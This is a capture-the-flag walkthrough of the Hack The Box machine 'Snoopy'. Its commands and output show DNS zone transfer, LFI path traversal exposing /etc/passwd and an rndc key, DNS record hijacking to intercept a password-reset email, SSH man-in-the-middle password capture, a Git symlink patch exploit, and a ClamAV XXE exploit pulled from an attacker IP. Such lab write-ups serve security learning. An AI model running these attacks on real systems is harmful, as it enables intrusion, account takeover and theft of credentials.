# hard - snoopy

## User Flag

### Checking ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

### HTML Review
The most relevant by reading html source code:
- http://snoopy.htb/download?file=announcement.pdf
    - It contains a PDF file compressed in a ZIP file
    - The PDF contains this email: pr@snoopy.htb, Sally Brown, SnoopySec
- http://snoopy.htb/download
    It contains a video and a PDF with some info: sbrown@snoopy.htb

Interesting links:
```html
<a href="blog-details.html" class="readmore stretched-link"><span>Read More</span><i class="bi bi-arrow-right"></i></a>
<a href="contact.html" class="btn-get-started">Get Started</a>
<li><a href="about.html">About</a></li>
<li><a href="contact.html">Contact</a></li>
<li><a href="index.html" class="active">Home</a></li>
<li><a href="team.html">Team</a></li>
```

{{< limg "/i/2023-08-21_21-40.png" "Main webpage snoopy.htb" >}}

Also something interesting, given that the server is listening on port `53`:
```html
<p>Attention:  As we migrate DNS records to our new domain please be advised that our mailserver 'mail.snoopy.htb' is currently offline.</p>
```

### DNS Exploitation

Then I just decided to test if the server broadcasts its DNS records, it does:
```bash
~➤ dig @snoopy.htb -tAXFR snoopy.htb
; <<>> DiG 9.18.18 <<>> @snoopy.htb -tAXFR snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
mm.snoopy.htb.          86400   IN      A       127.0.0.1
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 146 msec
;; SERVER: 10.10.11.212#53(snoopy.htb) (TCP)
;; WHEN: Mon Aug 21 21:34:30 -04 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

What is that mm.snoopy.htb? Ah Mattermost app:
{{< limg "/i/2023-08-21_21-41.png" "Mattermost app" >}}


### Download via LFI
Ok, so that `/download` is able to download Local files (LFI):
```bash
$ wget http://snoopy.htb/download?file=....//....//....//....//etc/passwd -O file.zip ; \
      unzip -f ./*.zip ; \
      find press* -type f -exec cat {} +

root:x:0:0:root:/root:/bin/bash
...
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
_laurel:x:999:998::/var/log/laurel:/bin/false
```

There we can see a bunch of users, I guess we will need to pivot between them cbrown, sbrown, lpelt, cshultz, vgray, clamav?.

Now, I will download `/etc/bind/named.config`, the following "rndc-key" should be stored in a separated file.
```bash
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```


### Intercepting SNMP messages

```bash
z➤ python -m smtpd -c DebuggingServer -n 127.0.0.1:25

~z➤ cat config
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
~z➤ nsupdate -k config
> server 10.10.11.212 53
> key hmac-sha256:rndc-key BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
> zone snoopy.htb
> update add mail.snoopy.htb 86400 A 10.10.14.7
> send
```

Keep in mind, 10.10.11.212 is snoopy.htb and 10.10.14.7 is my own IP.

Now we proceed to reset cbrown@snoopy.htb password on http://mm.snoopy.htb/reset_password you will get this message captured and get a token:
```bash
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dcqnjz='
b'gpxjwwqb7exk55sp6sjwkzdu3i8d4x4j3snhihydxkqfnew1o1rx5gq76qb )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
```

We are now able to login into mm using that token the reset cbrown's password:
{{< limg "/i/2023-08-25_10-18.png" "Reset cbrown password" >}}

### Intercetp SSH password by provisioning a server

I notice we have a command that helps us to provision a server via SSH, we can intercept that information.
{{< limg "/i/2023-08-25_10-19.png" "Prov a server" >}}

We start SSH MITM python tool:
```bash
~z➤ nohup sudo socat TCP-LISTEN:2222,fork TCP:127.0.0.1:10022 &

~z➤ sudo ./ssh-mitm-x86_64.AppImage server --remote-host snoopy.htb
───────────────────────────────────────────────────────────────────── SSH-MITM - ssh audits made simple ──────────────────────────────────────────────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:5b:a1:b5:a2:c3:62:5f:c5:9e:7a:4b:21:03:91:fa:81
   SHA256:/DbEweFwI9l3A1Sg509UFYa3PqvunuxHVUEZoIFJaDE
   SHA512:k8DArMtkQjcehr6kIxrFMhPvrgvL0ezJUChiq7aWpqJxYSNzegb567gjKxH40bUHtUDHLHbsH03GpYAaIHJ/8w
listen interfaces 0.0.0.0 and :: on port 10022
────────────────────────────────────────────────────────────────────────── waiting for connections ───────────────────────────────────────────────────────────────────────────

```

Once we provide a server from MM, we can see the password in the logs:
```bash
[08/25/23 10:36:58] INFO     ℹ session fe324ce5-e93b-4d1a-8a06-91d198f6dd78 created
[08/25/23 10:36:59] INFO     ℹ client information:
                               - client version: ssh-2.0-paramiko_3.1.0
                               - product name: Paramiko
                               - vendor url:  https://www.paramiko.org/
                             ⚠ client audit tests:
                               * client uses same server_host_key_algorithms list for unknown and known hosts
                               * Preferred server host key algorithm: ssh-ed25519
[08/25/23 10:37:00] INFO     Remote authentication succeeded
                                     Remote Address: snoopy.htb:22
                                     Username: cbrown
                                     Password: sn00pedcr3dential!!!
                                     Agent: no agent
[08/25/23 10:37:01] INFO     ℹ fe324ce5-e93b-4d1a-8a06-91d198f6dd78 - local port forwading
                             SOCKS port: 41275
                               SOCKS4:
                                 * socat: socat TCP-LISTEN:LISTEN_PORT,fork socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=41275
                                 * netcat: nc -X 4 -x localhost:41275 address port
                               SOCKS5:
                                 * netcat: nc -X 5 -x localhost:41275 address port
                    INFO     got ssh command: ls -la
[08/25/23 10:37:02] INFO     ℹ fe324ce5-e93b-4d1a-8a06-91d198f6dd78 - session started
                    INFO     got remote command: ls -la
                    INFO     remote command 'ls -la' exited with code: 0
                    INFO     ℹ session fe324ce5-e93b-4d1a-8a06-91d198f6dd78 closed
```

And we are now on cbrowns user shell:
```bash
.../p8/snoopy/lfi➤ ssh cbrown@snoopy.htb
cbrown@snoopy.htb's password:
cbrown@snoopy:~$ id
uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
cbrown@snoopy:~$ ls
```

### Exploiting Git CVE 
From here we have to pivot into another user account, I think `cbrown` :evil: (CVE-2023-22490 and CVE-2023-23946)
```bash
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Sorry, try again.
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

Generating a key:
```bash
cbrown@snoopy:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/cbrown/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/cbrown/.ssh/id_rsa
Your public key has been saved in /home/cbrown/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:yFq39a/ji6BsODGk9MPACg64VBilUiWjslGJuBDdbX4 cbrown@snoopy.htb
The key's randomart image is:
+---[RSA 3072]----+
|o=O=..           |
|+=++. o          |
|B+.  o           |
|B++ ....E        |
|*+ *  +.S .      |
|o.. *o . o .     |
|    .=  o   .    |
|    o... . ...   |
|     oo   ..++.  |
+----[SHA256]-----+
```

    Exploiting Git CVEs:
```bash
cbrown@snoopy:~$ mkdir repo; cd repo
cbrown@snoopy:~/repo$ git init
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>
Initialized empty Git repository in /home/cbrown/repo/.git/


cbrown@snoopy:~/repo$ echo "diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/create-me
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKedRFqb+23I77T/09HrcXnhZIYcDNJGk1k4V8mcg1pDCBTb+0N2hadgS4QuT846ZOsKFtBqiaZSaPebZAPw0htj7jrX2rsy0zrhXyWnaVFo0vYmVxogVYL7p67rM96vn4XW4+NaupBRvg07CNGdGgekoKj2TP8dCo/UPiSt5lCN0siYuQKuTI/VJnD6soy9TNGMV9hnX6UHDqnM8+PEu7oLaEPRz/ergSLxgHs/5qvZeeLTrhWtgvZkhHrp1dPWGVB+BY9+/EjvimeFbnvltAuMf8w8+fD1J5YoiK009buSOe/s4LaeLcWyFEoCGqEAVOWI8EqcH1XSumesAEvNoxpXjHKmwyQpRhXjwPGBSlteTCmFvGUBncY8YktV46hmHP+i1rLowyPhnbBWpMV7DOtfAPE5jZaXKNjmdKm0dgYwsHGkV677YcdDrg9FUM1wleECo8X+3w4GkFW3n+dWMK6hKeEosuW8IJX0SeTL+ESLBHVCrQaR9iWIKIRz/TFQU= cbrown@snoopy.htb" > patch


cbrown@snoopy:~/repo$ ln -s /home/sbrown/.ssh symlink
cbrown@snoopy:~/repo$ chmod 777 /home/cbrown/repo

cbrown@snoopy:~/repo$ sudo -u sbrown /usr/bin/git apply -v patch
Checking patch symlink => renamed-symlink...
Checking patch renamed-symlink/authorized_keys...
Applied patch symlink => renamed-symlink cleanly.
Applied patch renamed-symlink/authorized_keys cleanly.


cbrown@snoopy:~/repo$ ssh sbrown@snoopy.htb
...
sbrown@snoopy:~$ id
uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)
sbrown@snoopy:~$ ls
scanfiles  user.txt
```

## Root Flag
What we have in sudo?
```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

### ClamAV CVE-2023-20052

We exploit the vulnerability:
```bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
cd CVE-2023-20052
sudo docker build -t cve-2023-20052 .
sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash

genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Now we run clamscan with debug mode as required by sudo:
```bash
sbrown@snoopy:~/scanfiles$ wget http://10.10.14.7:6666/exploit.dmg .
--2023-08-25 15:26:54--  http://10.10.14.7:6666/exploit.dmg
Connecting to 10.10.14.7:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 114823 (112K) [application/octet-stream]
Saving to: 'exploit.dmg'
2023-08-25 15:26:54 (253 KB/s) - ‘exploit.dmg’ saved [114823/114823]
...
sbrown@snoopy:~/scanfiles$ ls
exploit.dmg
sbrown@snoopy:~/scanfiles$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib
LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
LibClamAV debug: Initialized 1.0.0 engine
```

And you will see the flag :)
{{< limg "/i/2023-08-25_11-28.png" "Clamscan CVE" >}}

## TODOs
- Review RNDC
    > rndc stands for Remote Name Daemon Control. It's a command line tool used to manage the BIND DNS server. With rndc, you can control the operation of a name server.
- Review in depth git: CVE-2023-22490 and CVE-2023-23946
